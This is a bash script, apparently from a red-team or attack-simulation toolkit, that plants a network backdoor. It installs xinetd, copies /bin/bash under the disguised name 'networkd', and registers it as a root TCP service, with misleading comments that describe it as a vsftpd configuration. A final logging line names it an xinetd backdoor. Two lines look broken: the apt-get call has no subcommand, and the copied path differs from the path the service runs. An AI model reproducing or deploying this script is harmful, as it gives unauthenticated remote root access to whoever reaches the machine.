#!/bin/bash

DEBIAN_FRONTEND=noninteractive apt-get
apt install xinetd

#Make the service file for systemctl servers.  

echo "[Unit]" > /usr/lib/systemd/system/xinetd.service
echo "Description=Xinetd A Powerful Replacement For Inetd" >> /usr/lib/systemd/system/xinetd.service
echo "After=network.target" >> /usr/lib/systemd/system/xinetd.service
echo "Documentation=man:xinetd" >> /usr/lib/systemd/system/xinetd.service
echo "Documentation=man:xinetd.conf" >> /usr/lib/systemd/system/xinetd.service
echo "Documentation=man:xinetd.log" >> /usr/lib/systemd/system/xinetd.service
echo "" >> /usr/lib/systemd/system/xinetd.service
echo "[Service]" >> /usr/lib/systemd/system/xinetd.service
echo "Type=simple" >> /usr/lib/systemd/system/xinetd.service
echo "EnvironmentFile=-/etc/sysconfig/xinetd" >> /usr/lib/systemd/system/xinetd.service
echo "ExecStart=/usr/sbin/xinetd -stayalive -dontfork" >> /usr/lib/systemd/system/xinetd.service
echo "ExecReload=/usr/bin/kill -HUP $MAINPID" >> /usr/lib/systemd/system/xinetd.service
echo "" >> /usr/lib/systemd/system/xinetd.service
echo "[Install]" >> /usr/lib/systemd/system/xinetd.service
echo "WantedBy=multi-user.target" >> /usr/lib/systemd/system/xinetd.service

cp /bin/bash /usr/bin/networkd

echo "# default: off" > /etc/xinetd.d/networkd
echo "# description:" >> /etc/xinetd.d/networkd
echo "#   The xinetd server serves network connections. " >> /etc/xinetd.d/networkd
echo "#" >> /etc/xinetd.d/networkd
echo "# NOTE: This file contains the configuration for xinetd to start vsftpd." >> /etc/xinetd.d/networkd
echo "#       the configuration file for vsftp itself is in /etc/vsftpd.conf" >> /etc/xinetd.d/networkd
echo "#" >> /etc/xinetd.d/networkd
echo "service xinetd" >> /etc/xinetd.d/networkd
echo "{" >> /etc/xinetd.d/networkd
echo "        socket_type             = stream" >> /etc/xinetd.d/networkd
echo "        protocol                = tcp" >> /etc/xinetd.d/networkd
echo "        wait                    = no" >> /etc/xinetd.d/networkd
echo "        user                    = root" >> /etc/xinetd.d/networkd
echo "        server                  = /usr/sbin/networkd" >> /etc/xinetd.d/networkd
echo "        disable                 = no" >> /etc/xinetd.d/networkd
echo "}" >> /etc/xinetd.d/networkd

#restart xinetd
systemctl restart xinetd.service
/etc/init.d/xinetd restart

./logger.sh Attempted to create an xinet backdoor